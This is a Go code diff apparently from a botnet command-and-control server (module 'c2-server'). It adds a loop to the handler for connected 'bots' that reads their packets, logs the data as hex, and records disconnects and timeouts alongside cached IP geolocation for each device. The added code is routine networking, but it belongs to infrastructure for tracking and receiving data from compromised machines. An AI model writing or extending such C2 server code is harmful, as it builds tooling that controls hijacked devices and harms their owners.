@@ -5,8 +5,12 @@ import (
 	"c2-server/constants"
 	"c2-server/lib"
 	"c2-server/types"
+	"encoding/hex"
+	"errors"
 	"fmt"
+	"io"
 	"net"
+	"os"
 	"time"
 )
 
@@ -82,4 +86,28 @@ func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
 	this.cache.SetCache(mac, "ipgeo", ipgeo, 10*time.Minute)
 
 	this.logger.Info(fmt.Sprintf("CONNECTED: %s:%d", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP, conn.RemoteAddr().(*net.TCPAddr).Port))
+
+	buffer := make([]byte, constants.MAX_PACKET_SIZE)
+
+	for {
+		data, err := conn.Read(buffer)
+		if err != nil {
+			if errors.Is(err, io.EOF) {
+				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
+			}
+
+			if sockErr, ok := err.(*net.OpError); ok && sockErr.Op == "read" && sockErr.Err.Error() == "use of closed network connection" {
+				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
+			} else if os.IsTimeout(err) {
+				this.logger.Info(fmt.Sprintf("Bot disconnect (timeout): %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
+			} else {
+				this.logger.Error(fmt.Sprintf("Error reading bot from connection: %s", err.Error())) // defer
+			}
+
+			break
+		}
+
+		this.logger.Info(fmt.Sprintf("DATA[%d]: %s", data, hex.EncodeToString(buffer[:data])))
+		// deviceClient.parseDate(buffer[:data])
+	}
 }
